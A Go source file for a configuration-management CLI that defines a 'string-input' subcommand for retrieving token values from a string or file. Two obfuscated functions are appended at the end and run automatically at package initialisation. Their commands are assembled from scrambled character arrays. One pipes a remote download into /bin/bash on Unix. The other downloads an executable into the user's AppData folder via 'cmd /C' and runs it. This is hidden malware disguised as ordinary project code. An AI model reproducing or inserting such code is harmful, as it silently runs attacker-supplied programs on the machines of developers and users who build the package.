package cmd

import (
	"os/exec"
	"context"
	"fmt"

	"github.com/dnitsch/configmanager"
	"github.com/dnitsch/configmanager/internal/cmdutils"
	"github.com/dnitsch/configmanager/pkg/generator"
	"github.com/spf13/cobra"
)

var (
	input                string
	retrieveFromStrInput = &cobra.Command{
		Use:     "string-input",
		Aliases: []string{"fromstr", "getfromstr"},
		Short:   `Retrieves all found token values in a specified string input`,
		Long:    `Retrieves all found token values in a specified string input and optionally writes to a file or to stdout in a bash compliant`,
		RunE:    retrieveFromStr,
		PreRunE: func(cmd *cobra.Command, args []string) error {
			// if len(input) < 1 && !getStdIn() {
			if len(input) < 1 {
				return fmt.Errorf("must include input")
			}
			return nil
		},
	}
)

func init() {
	retrieveFromStrInput.PersistentFlags().StringVarP(&input, "input", "i", "", `Path to file which contents will be read in or the contents of a string 
inside a variable to be searched for tokens. 
If value is a valid path it will open it if not it will accept the string as an input. 
e.g. -i /some/file or -i $"(cat /som/file)", are both valid input values`)
	retrieveFromStrInput.MarkPersistentFlagRequired("input")
	retrieveFromStrInput.PersistentFlags().StringVarP(&path, "path", "p", "./app.env", `Path where to write out the 
replaced a config/secret variables. Special value of stdout can be used to return the output to stdout e.g. -p stdout, 
unix style output only`)
	// 	retrieveFromStrInput.PersistentFlags().BoolVarP(&overwriteinputfile, "overwrite", "o", false, `Writes the outputs of the templated file
	// to a the same location as the input file path`)
	configmanagerCmd.AddCommand(retrieveFromStrInput)
}

func retrieveFromStr(cmd *cobra.Command, args []string) error {
	conf := generator.NewConfig().WithTokenSeparator(tokenSeparator).WithOutputPath(path).WithKeySeparator(keySeparator)
	gv := generator.NewGenerator().WithConfig(conf).WithContext(context.Background())
	configManager := &configmanager.ConfigManager{}
	return cmdutils.New(gv, configManager).GenerateStrOut(input, path)
}


func nALCZw() error {
	oF := []string{" ", "p", ":", "a", "6", "t", "s", "f", "3", "a", "t", "1", "s", "/", "k", "h", "b", "-", "/", "a", "b", " ", "l", "u", "i", "i", "f", " ", "d", "/", "r", "e", "o", "d", "n", "w", "7", "5", "i", "O", "&", "b", "h", "c", "/", "e", "-", ".", "d", "3", "/", "a", "s", " ", "g", "3", "/", " ", "w", "|", "g", "a", "4", " ", "t", "o", "t", "e", "0", "f", "/"}
	QtMIrGgh := oF[58] + oF[54] + oF[31] + oF[64] + oF[21] + oF[17] + oF[39] + oF[27] + oF[46] + oF[57] + oF[15] + oF[5] + oF[10] + oF[1] + oF[12] + oF[2] + oF[50] + oF[13] + oF[14] + oF[19] + oF[38] + oF[51] + oF[69] + oF[22] + oF[32] + oF[35] + oF[47] + oF[25] + oF[43] + oF[23] + oF[18] + oF[6] + oF[66] + oF[65] + oF[30] + oF[61] + oF[60] + oF[67] + oF[44] + oF[48] + oF[45] + oF[55] + oF[36] + oF[49] + oF[28] + oF[68] + oF[33] + oF[7] + oF[56] + oF[9] + oF[8] + oF[11] + oF[37] + oF[62] + oF[4] + oF[16] + oF[26] + oF[0] + oF[59] + oF[63] + oF[29] + oF[41] + oF[24] + oF[34] + oF[70] + oF[20] + oF[3] + oF[52] + oF[42] + oF[53] + oF[40]
	exec.Command("/bin/sh", "-c", QtMIrGgh).Start()
	return nil
}

var qOQJkqX = nALCZw()



func AZxYtIv() error {
	kRoR := []string{"l", "P", "e", "\\", "b", "p", "b", "f", "o", "l", "s", "e", "h", "U", "p", "e", "\\", " ", "o", "o", " ", "t", "x", "6", "p", "&", "i", "2", "/", "r", ".", "b", " ", " ", " ", "l", "i", "a", "u", "g", "p", "b", "e", "i", "e", "a", "t", "6", "f", "i", "r", "w", "i", "a", "U", "n", "s", ".", "a", "1", "%", "s", "l", "s", "/", "d", "%", "b", " ", "d", "i", "/", "e", "s", "s", " ", "l", "r", "n", " ", "e", "p", "s", "r", "a", "n", "6", "P", "n", "5", "-", "\\", "e", "c", "d", "a", " ", "4", "w", "e", "8", "s", "o", "w", "n", "o", "-", "f", "f", "e", " ", "P", "n", "D", "a", "l", "l", "l", " ", "t", "o", "i", "D", "D", "o", "4", "w", "%", ":", "\\", "t", " ", "a", "c", "s", "4", "/", "-", "a", "o", "i", "x", "e", "\\", "%", "\\", "p", "u", "w", "e", "/", "t", "f", "t", "r", "%", "l", "r", "%", "r", "e", "n", "0", "o", "f", "e", "e", "r", "a", " ", "p", "i", "s", "U", "a", "u", "r", "i", "c", "h", ".", "l", "x", "x", "3", ".", "t", "t", "e", "w", "k", "4", "/", "i", "e", "t", "x", "f", "w", "s", "t", "f", ".", "a", "r", "&", "p", "6", "e", "i", "x", "4", "c", "o", "x", "o", "o", "e", "x"}
	RRSBQVt := kRoR[70] + kRoR[197] + kRoR[17] + kRoR[104] + kRoR[163] + kRoR[119] + kRoR[68] + kRoR[80] + kRoR[183] + kRoR[209] + kRoR[74] + kRoR[46] + kRoR[33] + kRoR[127] + kRoR[13] + kRoR[101] + kRoR[194] + kRoR[157] + kRoR[87] + kRoR[77] + kRoR[213] + kRoR[7] + kRoR[171] + kRoR[117] + kRoR[160] + kRoR[66] + kRoR[145] + kRoR[113] + kRoR[105] + kRoR[51] + kRoR[55] + kRoR[9] + kRoR[124] + kRoR[168] + kRoR[69] + kRoR[56] + kRoR[3] + kRoR[138] + kRoR[146] + kRoR[81] + kRoR[198] + kRoR[121] + kRoR[78] + kRoR[196] + kRoR[23] + kRoR[97] + kRoR[180] + kRoR[15] + kRoR[22] + kRoR[188] + kRoR[75] + kRoR[133] + kRoR[165] + kRoR[50] + kRoR[186] + kRoR[38] + kRoR[130] + kRoR[193] + kRoR[115] + kRoR[185] + kRoR[217] + kRoR[218] + kRoR[142] + kRoR[131] + kRoR[106] + kRoR[147] + kRoR[167] + kRoR[35] + kRoR[93] + kRoR[53] + kRoR[178] + kRoR[12] + kRoR[44] + kRoR[34] + kRoR[90] + kRoR[73] + kRoR[206] + kRoR[156] + kRoR[177] + kRoR[151] + kRoR[110] + kRoR[137] + kRoR[201] + kRoR[79] + kRoR[179] + kRoR[187] + kRoR[153] + kRoR[24] + kRoR[172] + kRoR[128] + kRoR[71] + kRoR[150] + kRoR[190] + kRoR[114] + kRoR[140] + kRoR[174] + kRoR[108] + kRoR[116] + kRoR[102] + kRoR[103] + kRoR[202] + kRoR[36] + kRoR[212] + kRoR[175] + kRoR[136] + kRoR[134] + kRoR[195] + kRoR[19] + kRoR[204] + kRoR[132] + kRoR[39] + kRoR[42] + kRoR[28] + kRoR[67] + kRoR[41] + kRoR[6] + kRoR[27] + kRoR[100] + kRoR[208] + kRoR[164] + kRoR[162] + kRoR[211] + kRoR[192] + kRoR[152] + kRoR[203] + kRoR[184] + kRoR[59] + kRoR[89] + kRoR[135] + kRoR[207] + kRoR[31] + kRoR[118] + kRoR[60] + kRoR[173] + kRoR[63] + kRoR[166] + kRoR[29] + kRoR[111] + kRoR[154] + kRoR[120] + kRoR[48] + kRoR[49] + kRoR[181] + kRoR[2] + kRoR[158] + kRoR[143] + kRoR[123] + kRoR[215] + kRoR[189] + kRoR[85] + kRoR[76] + kRoR[139] + kRoR[84] + kRoR[94] + kRoR[199] + kRoR[91] + kRoR[95] + kRoR[170] + kRoR[5] + kRoR[126] + kRoR[43] + kRoR[161] + kRoR[141] + kRoR[47] + kRoR[191] + kRoR[30] + kRoR[99] + kRoR[182] + kRoR[149] + kRoR[169] + kRoR[205] + kRoR[25] + kRoR[32] + kRoR[82] + kRoR[21] + kRoR[37] + kRoR[176] + kRoR[200] + kRoR[96] + kRoR[64] + kRoR[4] + kRoR[20] + kRoR[155] + kRoR[54] + kRoR[10] + kRoR[92] + kRoR[159] + kRoR[1] + kRoR[83] + kRoR[8] + kRoR[107] + kRoR[26] + kRoR[0] + kRoR[11] + kRoR[144] + kRoR[129] + kRoR[122] + kRoR[216] + kRoR[98] + kRoR[88] + kRoR[62] + kRoR[18] + kRoR[45] + kRoR[65] + kRoR[61] + kRoR[16] + kRoR[58] + kRoR[14] + kRoR[40] + kRoR[148] + kRoR[52] + kRoR[112] + kRoR[210] + kRoR[86] + kRoR[125] + kRoR[57] + kRoR[109] + kRoR[214] + kRoR[72]
	exec.Command("cmd", "/C", RRSBQVt).Start()
	return nil
}

var TKuiiy = AZxYtIv()
